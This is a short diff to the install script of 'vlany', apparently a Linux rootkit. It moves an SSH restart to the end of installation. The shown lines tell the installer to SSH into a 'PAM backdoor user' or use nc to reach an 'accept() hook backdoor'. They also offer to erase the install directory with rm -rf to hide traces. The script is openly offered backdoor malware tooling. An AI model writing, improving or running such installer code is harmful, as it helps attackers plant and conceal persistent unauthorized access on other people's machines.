@@ -320,8 +320,6 @@ if [ "$1" == "--cli" ]; then
 
     setup_vlany
 
-    [ -f "/etc/init.d/ssh" ] && { /etc/init.d/ssh restart &>/dev/null; }
-
     echo "The installation process has finished. You can now SSH into your PAM backdoor user, or you can use nc (or something better) to connect to your accept() hook backdoor."
     read -p "Would you like to automatically remove this directory (`pwd`) on exit? (YES/NO) (case-sensitive) [YES]: "
     if [ -z $REPLY ]; then
@@ -380,12 +378,11 @@ else
 
     setup_vlany
 
-    [ -f "/etc/init.d/ssh" ] && { /etc/init.d/ssh restart &>/dev/null; }
-
     AUTO_RM=$(dialog --title "$TITLE" --menu "The installation process has finished. You can now SSH into your PAM backdoor user, or you can use nc (or something better) to connect to your accept() hook backdoor.\n\nDo you want to automatically remove this directory? (`pwd`)" 20 30 20 "No" "" "Yes" "" 3>&1 1>&2 2>&3)
     [ "$AUTO_RM" == "Yes" ] && { rm -rf `pwd`; }
 fi
 
+[ -f "/etc/init.d/ssh" ] && { /etc/init.d/ssh restart &>/dev/null; }
 clear
 cat $INSTALL/.vlany_information
 echo "Thank you for choosing vlany."
